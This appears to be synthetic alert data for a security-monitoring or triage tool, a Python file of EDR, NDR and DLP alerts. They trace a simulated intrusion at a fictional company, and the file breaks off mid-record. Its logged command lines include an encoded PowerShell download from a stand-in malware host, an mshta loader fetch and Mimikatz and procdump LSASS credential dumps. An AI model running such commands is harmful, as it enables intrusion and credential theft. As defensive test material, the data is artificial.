source_list = [
    "EDR", "XDR", "NDR", "IDS", "WAF", "DLP", "MAIL", "CLOUD", "IAM", "SIEM",
    "OT", "FIREWALL", "PROXY", "UEBA", "TI",
]

edr_alerts = [
    {
        "source": "EDR",
        "rule_id": "EDR-Rule-11-Suspicious-Process-Spawned-by-Office",
        "rule_name": "Office应用启动可疑进程",
        "alert_date": "2025-09-18T13:30:15Z",
        "tags": ["phishing", "office", "powershell"],
        "severity": "Medium",
        "reference": "主机FIN-WKS-JDOE-05上Word启动了PowerShell",
        "description": "在主机 FIN-WKS-JDOE-05 上，由 WINWORD.EXE 启动的 PowerShell 进程被检测到，这通常与宏病毒或钓鱼攻击有关。",
        "artifacts": [
            {"type": "hostname", "value": "FIN-WKS-JDOE-05"},
            {"type": "ip", "value": "192.168.1.101"},
            {"type": "username", "value": "j.doe"},
            {"type": "parent_process_name", "value": "winword.exe"},
            {"type": "parent_process_path", "value": "c:\\program files\\microsoft office\\root\\office16\\winword.exe"},
            {"type": "process_name", "value": "powershell.exe"},
            {"type": "process_path", "value": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe"},
            {"type": "command_line",
             "value": "powershell.exe -enc VwByAGkAdABlAC0ASABvAHMAdAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBtAGEAbAB3AGEAcgBlLmRvbWFpbi5jb20ALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA=="}
        ],
        "raw_log": {
            "agent_id": "agent-guid-finance05",
            "timestamp": "2025-09-18T13:30:14.582Z",
            "event_type": "ProcessCreation",
            "process_details": {
                "pid": 6124,
                "path": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
                "command_line": "powershell.exe -encodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBtAGEAbAB3AGEAcgBlLmRvbWFpbi5jb20ALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==",
                "hash_sha256": "a9b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1",
                "parent_pid": 4820,
                "parent_path": "c:\\program files\\microsoft office\\root\\office16\\winword.exe"
            },
            "user_details": {"username": "j.doe", "domain": "MYCORP"},
            "device_details": {"hostname": "FIN-WKS-JDOE-05", "ip_address": "192.168.1.101"}
        }
    },
    {
        "source": "EDR",
        "rule_id": "EDR-Rule-11-Suspicious-Process-Spawned-by-Office",
        "rule_name": "Office应用启动可疑进程",
        "alert_date": "2025-09-18T13:32:45Z",
        "tags": ["phishing", "office", "powershell"],
        "severity": "Medium",
        "reference": "主机FIN-WKS-JDOE-05上Word启动的PowerShell再次活动",
        "description": "在主机 FIN-WKS-JDOE-05 上，再次检测到与近期活动相同的、由WINWORD.EXE启动的PowerShell进程。",
        "artifacts": [
            {"type": "hostname", "value": "FIN-WKS-JDOE-05"},
            {"type": "ip", "value": "192.168.1.101"},
            {"type": "username", "value": "j.doe"},
            {"type": "parent_process_name", "value": "winword.exe"},
            {"type": "parent_process_path", "value": "c:\\program files\\microsoft office\\root\\office16\\winword.exe"},
            {"type": "process_name", "value": "powershell.exe"},
            {"type": "process_path", "value": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-finance05",
            "timestamp": "2025-09-18T13:32:44.912Z",
            "event_type": "ProcessCreation",
            "process_details": {
                "pid": 6188,
                "path": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
                "command_line": "powershell.exe -i -c whoami",
                "hash_sha256": "a9b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1",
                "parent_pid": 4820,
                "parent_path": "c:\\program files\\microsoft office\\root\\office16\\winword.exe"
            },
            "user_details": {"username": "j.doe", "domain": "MYCORP"},
            "device_details": {"hostname": "FIN-WKS-JDOE-05", "ip_address": "192.168.1.101"}
        }
    }, {
        "source": "EDR",
        "rule_id": "EDR-Rule-21-CobaltStrike-Beacon-Detected",
        "rule_name": "检测到Cobalt Strike C2 Beacon",
        "alert_date": "2025-09-18T13:35:10Z",
        "tags": ["c2", "cobaltstrike"],
        "severity": "Critical",
        "reference": "主机FIN-WKS-JDOE-05疑似建立C2通信",
        "description": "在主机 FIN-WKS-JDOE-05 上，powershell.exe 进程发起了到 known-bad.c2.server 的网络连接，其流量特征与 Cobalt Strike Beacon 匹配。",
        "artifacts": [
            {"type": "hostname", "value": "FIN-WKS-JDOE-05"},
            {"type": "ip", "value": "192.168.1.101"},
            {"type": "username", "value": "j.doe"},
            {"type": "process_name", "value": "powershell.exe"},
            {"type": "destination_domain", "value": "known-bad.c2.server"},
            {"type": "destination_ip", "value": "198.51.100.50"},
            {"type": "destination_port", "value": "443"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-finance05",
            "timestamp": "2025-09-18T13:35:09.776Z",
            "event_type": "NetworkConnection",
            "process_details": {
                "pid": 6188,
                "path": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
                "hash_sha256": "a9b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1"
            },
            "network_details": {
                "protocol": "TCP",
                "source_ip": "192.168.1.101",
                "source_port": 51234,
                "destination_ip": "198.51.100.50",
                "destination_port": 443,
                "destination_domain": "known-bad.c2.server",
                "direction": "outbound"
            },
            "user_details": {"username": "j.doe", "domain": "MYCORP"},
            "device_details": {"hostname": "FIN-WKS-JDOE-05", "ip_address": "192.168.1.101"}
        }
    }, {
        "source": "EDR",
        "rule_id": "EDR-Rule-07-Credential-Dumping-LSASS",
        "rule_name": "LSASS内存凭据窃取",
        "alert_date": "2025-09-18T14:05:25Z",
        "tags": ["lsass", "mimikatz", "credential-dumping"],
        "severity": "High",
        "reference": "主机SRV-DC-01检测到Mimikatz凭据窃取",
        "description": "在域控服务器 SRV-DC-01 上，检测到 mimikatz.exe 进程访问 LSASS 进程内存，这是严重的安全威胁。",
        "artifacts": [
            {"type": "hostname", "value": "SRV-DC-01"},
            {"type": "ip", "value": "10.10.1.5"},
            {"type": "username", "value": "administrator"},
            {"type": "process_name", "value": "mimikatz.exe"},
            {"type": "process_path", "value": "c:\\users\\administrator\\desktop\\tools\\mimikatz.exe"},
            {"type": "target_process", "value": "lsass.exe"},
            {"type": "filehash_sha256", "value": "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-dc01",
            "timestamp": "2025-09-18T14:05:24.123Z",
            "event_type": "LsassMemoryAccess",
            "process_details": {
                "pid": 3344,
                "path": "c:\\users\\administrator\\desktop\\tools\\mimikatz.exe",
                "command_line": "mimikatz.exe \"sekurlsa::logonpasswords\"",
                "hash_sha256": "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2"
            },
            "target_process_details": {"pid": 720, "path": "c:\\windows\\system32\\lsass.exe"},
            "user_details": {"username": "administrator", "domain": "MYCORP"},
            "device_details": {"hostname": "SRV-DC-01", "ip_address": "10.10.1.5"}
        }
    }, {
        "source": "EDR",
        "rule_id": "EDR-Rule-07-Credential-Dumping-LSASS",
        "rule_name": "LSASS内存凭据窃取",
        "alert_date": "2025-09-18T14:10:40Z",
        "tags": ["lsass", "procdump", "credential-dumping"],
        "severity": "High",
        "reference": "主机SRV-DC-01检测到Procdump转储LSASS",
        "description": "在域控服务器 SRV-DC-01 上，检测到 procdump.exe 进程转储 LSASS 进程内存，这是一种常见的凭据窃取技术。",
        "artifacts": [
            {"type": "hostname", "value": "SRV-DC-01"},
            {"type": "ip", "value": "10.10.1.5"},
            {"type": "username", "value": "administrator"},
            {"type": "process_name", "value": "procdump.exe"},
            {"type": "process_path", "value": "c:\\windows\\temp\\procdump.exe"},
            {"type": "target_process", "value": "lsass.exe"},
            {"type": "filehash_sha256", "value": "d3e4f5a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-dc01",
            "timestamp": "2025-09-18T14:10:39.888Z",
            "event_type": "LsassMemoryAccess",
            "process_details": {
                "pid": 3512,
                "path": "c:\\windows\\temp\\procdump.exe",
                "command_line": "procdump.exe -ma lsass.exe lsass.dmp",
                "hash_sha256": "d3e4f5a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9"
            },
            "target_process_details": {"pid": 720, "path": "c:\\windows\\system32\\lsass.exe"},
            "user_details": {"username": "administrator", "domain": "MYCORP"},
            "device_details": {"hostname": "SRV-DC-01", "ip_address": "10.10.1.5"}
        }
    }, {
        "source": "EDR",
        "rule_id": "EDR-Rule-07-Credential-Dumping-LSASS",
        "rule_name": "LSASS内存凭据窃取",
        "alert_date": "2025-09-18T14:15:00Z",
        "tags": ["lsass", "credential-dumping"],
        "severity": "High",
        "reference": "主机SRV-FILE-02检测到凭据窃取",
        "description": "在文件服务器 SRV-FILE-02 上，检测到可疑进程访问 LSASS 进程内存。",
        "artifacts": [
            {"type": "hostname", "value": "SRV-FILE-02"},
            {"type": "ip", "value": "10.10.2.18"},
            {"type": "username", "value": "administrator"},
            {"type": "process_name", "value": "dumpert.exe"},
            {"type": "target_process", "value": "lsass.exe"},
            {"type": "filehash_sha256", "value": "f1e2d3c4b5a6f7e8d9c0b1a2f3e4d5c6b7a8f9e0d1c2b3a4f5e6d7c8b9a0f1e2"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-files02",
            "timestamp": "2025-09-18T14:14:59.345Z",
            "event_type": "LsassMemoryAccess",
            "process_details": {
                "pid": 1980,
                "path": "c:\\temp\\dumpert.exe",
                "command_line": "dumpert.exe -p 720",
                "hash_sha256": "f1e2d3c4b5a6f7e8d9c0b1a2f3e4d5c6b7a8f9e0d1c2b3a4f5e6d7c8b9a0f1e2"
            },
            "target_process_details": {"pid": 720, "path": "c:\\windows\\system32\\lsass.exe"},
            "user_details": {"username": "administrator", "domain": "MYCORP"},
            "device_details": {"hostname": "SRV-FILE-02", "ip_address": "10.10.2.18"}
        }
    }, {
        "source": "EDR",
        "rule_id": "EDR-Rule-21-CobaltStrike-Beacon-Detected",
        "rule_name": "检测到Cobalt Strike C2 Beacon",
        "alert_date": "2025-09-18T14:40:15Z",
        "tags": ["c2", "cobaltstrike"],
        "severity": "Critical",
        "reference": "主机FIN-WKS-JDOE-05持续C2通信",
        "description": "在主机 FIN-WKS-JDOE-05 上，持续检测到与已知 Cobalt Strike 服务器 known-bad.c2.server 的出站连接。",
        "artifacts": [
            {"type": "hostname", "value": "FIN-WKS-JDOE-05"},
            {"type": "ip", "value": "192.168.1.101"},
            {"type": "username", "value": "j.doe"},
            {"type": "process_name", "value": "powershell.exe"},
            {"type": "destination_domain", "value": "known-bad.c2.server"},
            {"type": "destination_ip", "value": "198.51.100.50"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-finance05",
            "timestamp": "2025-09-18T14:40:14.654Z",
            "event_type": "NetworkConnection",
            "process_details": {"pid": 6188, "path": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe"},
            "network_details": {
                "protocol": "HTTPS",
                "destination_ip": "198.51.100.50",
                "destination_port": 443,
                "destination_domain": "known-bad.c2.server"
            },
            "user_details": {"username": "j.doe", "domain": "MYCORP"},
            "device_details": {"hostname": "FIN-WKS-JDOE-05", "ip_address": "192.168.1.101"}
        }
    }, {
        "source": "EDR",
        "rule_id": "EDR-Rule-21-CobaltStrike-Beacon-Detected",
        "rule_name": "检测到Cobalt Strike C2 Beacon",
        "tags": ["c2", "cobaltstrike"],
        "alert_date": "2025-09-18T14:42:20Z",
        "severity": "Critical",
        "reference": "主机FIN-WKS-JDOE-05持续C2通信",
        "description": "在主机 FIN-WKS-JDOE-05 上，再次检测到与已知 Cobalt Strike 服务器 known-bad.c2.server 的出站连接。",
        "artifacts": [
            {"type": "hostname", "value": "FIN-WKS-JDOE-05"},
            {"type": "ip", "value": "192.168.1.101"},
            {"type": "process_name", "value": "powershell.exe"},
            {"type": "destination_domain", "value": "known-bad.c2.server"},
            {"type": "destination_ip", "value": "198.51.100.50"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-finance05",
            "timestamp": "2025-09-18T14:42:19.998Z",
            "event_type": "NetworkConnection",
            "process_details": {"pid": 6188, "path": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe"},
            "network_details": {"protocol": "HTTPS", "destination_ip": "198.51.100.50", "destination_domain": "known-bad.c2.server"},
            "user_details": {"username": "j.doe", "domain": "MYCORP"},
            "device_details": {"hostname": "FIN-WKS-JDOE-05", "ip_address": "192.168.1.101"}
        }
    }, {
        "source": "EDR",
        "rule_id": "EDR-Rule-11-Suspicious-Process-Spawned-by-Office",
        "rule_name": "Office应用启动可疑进程",
        "tags": ["phishing", "office", "mshta"],
        "alert_date": "2025-09-18T14:50:00Z",
        "severity": "Medium",
        "reference": "主机MKT-WKS-ASMITH-01上Excel启动了mshta",
        "description": "在主机 MKT-WKS-ASMITH-01 上，由 EXCEL.EXE 启动的 mshta.exe 进程被检测到，这是一种常见的恶意载荷执行方式。",
        "artifacts": [
            {"type": "hostname", "value": "MKT-WKS-ASMITH-01"},
            {"type": "ip", "value": "192.168.2.54"},
            {"type": "username", "value": "a.smith"},
            {"type": "parent_process_name", "value": "excel.exe"},
            {"type": "process_name", "value": "mshta.exe"},
            {"type": "command_line", "value": "mshta.exe http://phishing-site.com/loader.hta"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-marketing01",
            "timestamp": "2025-09-18T14:49:59.123Z",
            "event_type": "ProcessCreation",
            "process_details": {
                "pid": 7788,
                "path": "c:\\windows\\system32\\mshta.exe",
                "command_line": "mshta.exe http://phishing-site.com/loader.hta",
                "hash_sha256": "c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2",
                "parent_pid": 5544,
                "parent_path": "c:\\program files\\microsoft office\\root\\office16\\excel.exe"
            },
            "user_details": {"username": "a.smith", "domain": "MYCORP"},
            "device_details": {"hostname": "MKT-WKS-ASMITH-01", "ip_address": "192.168.2.54"}
        }
    }, {
        "source": "EDR",
        "rule_id": "EDR-Rule-11-Suspicious-Process-Spawned-by-Office",
        "rule_name": "Office应用启动可疑进程",
        "alert_date": "2025-09-18T14:51:30Z",
        "tags": ["phishing", "office", "mshta"],
        "severity": "High",
        "reference": "主机MKT-WKS-ASMITH-01重复检测到Excel启动可疑进程",
        "description": "在主机 MKT-WKS-ASMITH-01 上，再次检测到由 EXCEL.EXE 启动的 mshta.exe 进程。",
        "artifacts": [
            {"type": "hostname", "value": "MKT-WKS-ASMITH-01"},
            {"type": "ip", "value": "192.168.2.54"},
            {"type": "username", "value": "a.smith"},
            {"type": "parent_process_name", "value": "excel.exe"},
            {"type": "process_name", "value": "mshta.exe"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-marketing01",
            "timestamp": "2025-09-18T14:51:29.678Z",
            "event_type": "ProcessCreation",
            "process_details": {
                "pid": 7810,
                "path": "c:\\windows\\system32\\mshta.exe",
                "command_line": "mshta.exe http://phishing-site.com/loader.hta",
                "hash_sha256": "c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2",
                "parent_pid": 5544,
                "parent_path": "c:\\program files\\microsoft office\\root\\office16\\excel.exe"
            },
            "user_details": {"username": "a.smith", "domain": "MYCORP"},
            "device_details": {"hostname": "MKT-WKS-ASMITH-01", "ip_address": "192.168.2.54"}
        }
    }
]

ndr_alert = [
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-05-Suspect-C2-Communication",
        "rule_name": "可疑的命令与控制（C2）通信",
        "alert_date": "2025-09-18T13:35:10Z",
        "tags": ["c2", "cobaltstrike", "network"],
        "severity": "Critical",
        "reference": "主机FIN-WKS-JDOE-05与已知C2服务器通信",
        "description": "检测到主机 FIN-WKS-JDOE-05 发起出站连接到被标记为恶意 C2 服务器的 IP 地址 198.51.100.50。流量特征与 Cobalt Strike Beacon 模式高度匹配。",
        "artifacts": [
            {"type": "hostname", "value": "FIN-WKS-JDOE-05"},
            {"type": "source_ip", "value": "192.168.1.101"},
            {"type": "destination_ip", "value": "198.51.100.50"},
            {"type": "destination_domain", "value": "known-bad.c2.server"},
            {"type": "destination_port", "value": "443"},
            {"type": "protocol", "value": "HTTPS"}
        ],
        "raw_log": {
            "sensor_id": "ndr-sensor-finance",
            "timestamp": "2025-09-18T13:35:09.800Z",
            "event_type": "Flow",
            "flow_details": {
                "source_ip": "192.168.1.101",
                "source_port": 51234,
                "destination_ip": "198.51.100.50",
                "destination_port": 443,
                "protocol": "TCP",
                "bytes_in": 1024,
                "bytes_out": 512,
                "duration_seconds": 5
            },
            "network_context": {
                "destination_domain": "known-bad.c2.server",
                "threat_intel": {"source": "threat-feed-X", "match": "Cobalt Strike C2 server"}
            },
            "device_details": {"hostname": "FIN-WKS-JDOE-05"}
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-12-Lateral-Movement-Attempt",
        "rule_name": "主机到主机的横向移动尝试",
        "alert_date": "2025-09-18T14:12:00Z",
        "tags": ["lateral-movement", "internal-scan"],
        "severity": "High",
        "reference": "主机FIN-WKS-JDOE-05对域控SRV-DC-01发起异常连接",
        "description": "检测到 FIN-WKS-JDOE-05（工作站）发起大量到域控制器 SRV-DC-01 的 SMB 和 LDAP 连接，这与常规用户行为不符，表明可能存在横向移动或侦察行为。",
        "artifacts": [
            {"type": "hostname", "value": "FIN-WKS-JDOE-05"},
            {"type": "source_ip", "value": "192.168.1.101"},
            {"type": "destination_ip", "value": "10.10.1.5"},
            {"type": "destination_hostname", "value": "SRV-DC-01"},
            {"type": "protocol", "value": "SMB", "port": 445},
            {"type": "protocol", "value": "LDAP", "port": 389}
        ],
        "raw_log": {
            "sensor_id": "ndr-sensor-finance",
            "timestamp": "2025-09-18T14:11:59.550Z",
            "event_type": "AnomalousFlow",
            "flow_details": {
                "source_ip": "192.168.1.101",
                "destination_ip": "10.10.1.5",
                "destination_port": [445, 389],
                "protocol": ["SMB", "LDAP"],
                "flow_count": 25,
                "flow_rate_per_sec": 5
            },
            "network_context": {
                "source_device_type": "workstation",
                "destination_device_type": "domain-controller",
                "behavior_anomaly": "Unusual high-volume SMB/LDAP traffic from a workstation to a DC"
            },
            "device_details": {"hostname": "FIN-WKS-JDOE-05"}
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-15-Unauthorized-Data-Exfiltration",
        "rule_name": "异常数据外泄",
        "alert_date": "2025-09-18T14:18:30Z",
        "tags": ["exfiltration", "data-transfer", "unusual-port"],
        "severity": "High",
        "reference": "主机SRV-DC-01向外部IP传输异常数据量",
        "description": "域控制器 SRV-DC-01 正在通过非标准端口（44443）向外部 IP 地址 203.0.113.78 发送大量加密数据。此模式通常与数据外泄有关。",
        "artifacts": [
            {"type": "hostname", "value": "SRV-DC-01"},
            {"type": "source_ip", "value": "10.10.1.5"},
            {"type": "destination_ip", "value": "203.0.113.78"},
            {"type": "destination_port", "value": "44443"},
            {"type": "data_volume", "value": "1.2 GB"}
        ],
        "raw_log": {
            "sensor_id": "ndr-sensor-dc",
            "timestamp": "2025-09-18T14:18:29.112Z",
            "event_type": "Flow",
            "flow_details": {
                "source_ip": "10.10.1.5",
                "destination_ip": "203.0.113.78",
                "destination_port": 44443,
                "protocol": "TCP",
                "bytes_out": 1200000000,
                "duration_seconds": 180
            },
            "network_context": {
                "flow_direction": "outbound",
                "behavior_anomaly": "Large volume of data transfer on an unusual port to an external host"
            },
            "device_details": {"hostname": "SRV-DC-01"}
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-12-Lateral-Movement-Attempt",
        "rule_name": "主机到主机的横向移动尝试",
        "alert_date": "2025-09-18T14:20:05Z",
        "tags": ["lateral-movement", "internal-scan"],
        "severity": "High",
        "reference": "主机SRV-DC-01对文件服务器SRV-FILE-02发起异常连接",
        "description": "检测到 SRV-DC-01（域控）正在扫描并尝试连接到 SRV-FILE-02（文件服务器）。该行为模式与攻击者在内网中进行横向移动以寻找新目标相符。",
        "artifacts": [
            {"type": "hostname", "value": "SRV-DC-01"},
            {"type": "source_ip", "value": "10.10.1.5"},
            {"type": "destination_ip", "value": "10.10.2.18"},
            {"type": "destination_hostname", "value": "SRV-FILE-02"},
            {"type": "protocol", "value": "SMB", "port": 445}
        ],
        "raw_log": {
            "sensor_id": "ndr-sensor-dc",
            "timestamp": "2025-09-18T14:20:04.990Z",
            "event_type": "AnomalousFlow",
            "flow_details": {
                "source_ip": "10.10.1.5",
                "destination_ip": "10.10.2.18",
                "destination_port": 445,
                "protocol": "SMB",
                "flow_count": 50,
                "flow_rate_per_sec": 10
            },
            "network_context": {
                "source_device_type": "domain-controller",
                "destination_device_type": "file-server",
                "behavior_anomaly": "Port scan/enumeration activity from a DC to a file server"
            },
            "device_details": {"hostname": "SRV-DC-01"}
        }
    },
    {
        "source": "NDR",
        "rule_id": "NDR-Rule-05-Suspect-C2-Communication",
        "rule_name": "可疑的命令与控制（C2）通信",
        "alert_date": "2025-09-18T14:40:15Z",
        "tags": ["c2", "cobaltstrike", "network"],
        "severity": "Critical",
        "reference": "主机FIN-WKS-JDOE-05与已知C2服务器持续通信",
        "description": "FIN-WKS-JDOE-05 与已知 C2 服务器 known-bad.c2.server (198.51.100.50) 之间持续存在低流量、周期性出站连接。这种通信模式是持续性命令与控制活动的典型特征。",
        "artifacts": [
            {"type": "hostname", "value": "FIN-WKS-JDOE-05"},
            {"type": "source_ip", "value": "192.168.1.101"},
            {"type": "destination_ip", "value": "198.51.100.50"},
            {"type": "destination_domain", "value": "known-bad.c2.server"},
            {"type": "destination_port", "value": "443"},
            {"type": "protocol", "value": "HTTPS"}
        ],
        "raw_log": {
            "sensor_id": "ndr-sensor-finance",
            "timestamp": "2025-09-18T14:40:14.654Z",
            "event_type": "Flow",
            "flow_details": {
                "source_ip": "192.168.1.101",
                "destination_ip": "198.51.100.50",
                "destination_port": 443,
                "protocol": "HTTPS",
                "bytes_in": 256,
                "bytes_out": 128,
                "duration_seconds": 2
            },
            "network_context": {
                "flow_direction": "outbound",
                "threat_intel": {"source": "threat-feed-X", "match": "Cobalt Strike C2 server"}
            },
            "behavior_pattern": "Periodic, low-volume communication typical of a beaconing C2"
        },
        "related_events": ["EDR-Rule-21-CobaltStrike-Beacon-Detected"]
    }
]

dlp_alert = [
    {
        "source": "DLP",
        "rule_id": "DLP-Rule-08-Financial-Record-Transfer-to-USB",
        "rule_name": "财务记录传输到可移动设备",
        "alert_date": "2025-09-18T15:25:55Z",
        "tags": ["finance", "exfiltration", "usb"],
        "severity": "High",
        "reference": "用户j.doe将公司财务报表复制到U盘",
        "description": "检测到用户 j.doe 将包含公司季度财务数据的 Excel 文件复制到连接到 FIN-WKS-JDOE-05 主机的可移动存储设备。",
        "artifacts": [
            {"type": "username", "value": "j.doe"},
            {"type": "hostname", "value": "FIN-WKS-JDOE-05"},
            {"type": "action", "value": "file-copy-to-usb"},
            {"type": "data_classification", "value": "Financial"},
            {"type": "file_name", "value": "Q3_Financial_Report.xlsx"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-finance05",
            "timestamp": "2025-09-18T15:25:54.660Z",
            "event_type": "DataTransfer",
            "data_source": "Local File System",
            "data_destination": "Removable Media",
            "file_details": {
                "file_path": "C:\\Users\\j.doe\\Documents\\Reports\\Q3_Financial_Report.xlsx",
                "file_hash_sha256": "c3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4",
                "classification_tags": ["Financial", "Confidential"]
            },
            "transfer_details": {
                "device_type": "USB-Drive",
                "device_serial": "A1B2C3D4E5F6"
            },
            "user_details": {"username": "j.doe", "domain": "MYCORP"},
            "device_details": {"hostname": "FIN-WKS-JDOE-05", "ip_address": "192.168.1.101"}
        }
    },
    {
        "source": "DLP",
        "rule_id": "DLP-Rule-09-Source-Code-Upload-to-Pastebin",
        "rule_name": "源代码上传到公共网站",
        "alert_date": "2025-09-18T15:30:15Z",
        "tags": ["source-code", "exfiltration", "web"],
        "severity": "Critical",
        "reference": "研发部员工在公共网站发布源代码",
        "description": "检测到研发部用户试图将包含公司专有源代码的文本片段上传到 pastebin.com。这属于严重的数据外泄行为。",
        "artifacts": [
            {"type": "username", "value": "d.chen"},
            {"type": "hostname", "value": "DEV-WKS-DCHEN-12"},
            {"type": "ip", "value": "10.10.3.25"},
            {"type": "action", "value": "web-upload"},
            {"type": "data_classification", "value": "Proprietary Source Code"},
            {"type": "destination_domain", "value": "pastebin.com"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-dev12",
            "timestamp": "2025-09-18T15:30:14.981Z",
            "event_type": "DataTransfer",
            "data_source": "Clipboard",
            "data_destination": "Web",
            "data_details": {
                "extracted_content_hash": "e1f2d3c4b5a6f7e8d9c0b1a2f3e4d5c6b7a8f9e0d1c2b3a4f5e6d7c8b9a0f1e2",
                "classification_tags": ["Proprietary Code", "Project-Nova"]
            },
            "transfer_details": {
                "application": "chrome.exe",
                "url": "https://pastebin.com/post"
            },
            "user_details": {"username": "d.chen", "domain": "MYCORP"},
            "device_details": {"hostname": "DEV-WKS-DCHEN-12", "ip_address": "10.10.3.25"}
        }
    },
    {
        "source": "DLP",
        "rule_id": "DLP-Rule-10-Health-Information-Transfer",
        "rule_name": "受保护健康信息（PHI）传输",
        "alert_date": "2025-09-18T15:35:40Z",
        "tags": ["phi", "healthcare", "exfiltration"],
        "severity": "High",
        "reference": "HR部门员工外发员工健康数据",
        "description": "人力资源部用户 h.lin 试图通过电子邮件将包含员工受保护健康信息（PHI）的文件发送给外部收件人。",
        "artifacts": [
            {"type": "username", "value": "h.lin"},
            {"type": "hostname", "value": "HR-WKS-HLIN-03"},
            {"type": "ip", "value": "192.168.4.15"},
            {"type": "action", "value": "email-send"},
            {"type": "data_classification", "value": "PHI"},
            {"type": "file_name", "value": "Employee_Health_Data.csv"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-hr03",
            "timestamp": "2025-09-18T15:35:39.145Z",
            "event_type": "DataTransfer",
            "data_source": "Outlook",
            "data_destination": "External Email",
            "file_details": {
                "file_path": "C:\\Users\\h.lin\\Documents\\Employee_Health_Data.csv",
                "file_hash_sha256": "f3d4c5b6a7e8d9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1e2d3f4",
                "classification_tags": ["PHI", "HIPAA-Compliance"]
            },
            "transfer_details": {
                "protocol": "SMTP",
                "recipient": "external.clinic@example.com",
                "subject": "Staff Health Records"
            },
            "user_details": {"username": "h.lin", "domain": "MYCORP"},
            "device_details": {"hostname": "HR-WKS-HLIN-03", "ip_address": "192.168.4.15"}
        }
    },
    {
        "source": "DLP",
        "rule_id": "DLP-Rule-11-Leaked-API-Key-in-Code",
        "rule_name": "API密钥泄露",
        "alert_date": "2025-09-18T15:40:00Z",
        "tags": ["api-key", "secrets", "source-code"],
        "severity": "High",
        "reference": "Git推送中包含硬编码API密钥",
        "description": "检测到用户 m.li 在代码提交中包含硬编码的敏感 API 密钥。此行为可能导致未授权访问公司的服务。",
        "artifacts": [
            {"type": "username", "value": "m.li"},
            {"type": "hostname", "value": "DEV-WKS-MLI-08"},
            {"type": "ip", "value": "10.10.3.18"},
            {"type": "action", "value": "code-commit"},
            {"type": "data_classification", "value": "Secrets"},
            {"type": "repository", "value": "git.mycorp.com/backend-service"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-dev08",
            "timestamp": "2025-09-18T15:39:59.810Z",
            "event_type": "CodeCommit",
            "application": "git.exe",
            "data_details": {
                "extracted_content": "API_KEY = \"sk_live_abcdefg123456789\"",
                "classification_tags": ["API-Key", "Hardcoded-Secrets"]
            },
            "commit_details": {
                "repo_url": "git.mycorp.com/backend-service",
                "commit_hash": "9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c"
            },
            "user_details": {"username": "m.li", "domain": "MYCORP"},
            "device_details": {"hostname": "DEV-WKS-MLI-08", "ip_address": "10.10.3.18"}
        }
    },
    {
        "source": "DLP",
        "rule_id": "DLP-Rule-12-Internal-SSN-Transfer",
        "rule_name": "内部社会安全号码（SSN）传输",
        "alert_date": "2025-09-18T15:45:20Z",
        "tags": ["pii", "ssn", "internal-communication"],
        "severity": "Medium",
        "reference": "用户j.doe通过内部邮件发送SSN",
        "description": "用户 j.doe 在内部电子邮件中发送了包含多个员工社会安全号码的列表，此行为违反了数据保护政策。",
        "artifacts": [
            {"type": "username", "value": "j.doe"},
            {"type": "hostname", "value": "FIN-WKS-JDOE-05"},
            {"type": "action", "value": "internal-email"},
            {"type": "data_classification", "value": "PII-SSN"}
        ],
        "raw_log": {
            "agent_id": "agent-guid-finance05",
            "timestamp": "2025-09-18T15:45:19.456Z",
            "event_type": "DataTransfer",
            "data_source": "Outlook",
            "data_destination": "Internal Email",
            "data_details": {
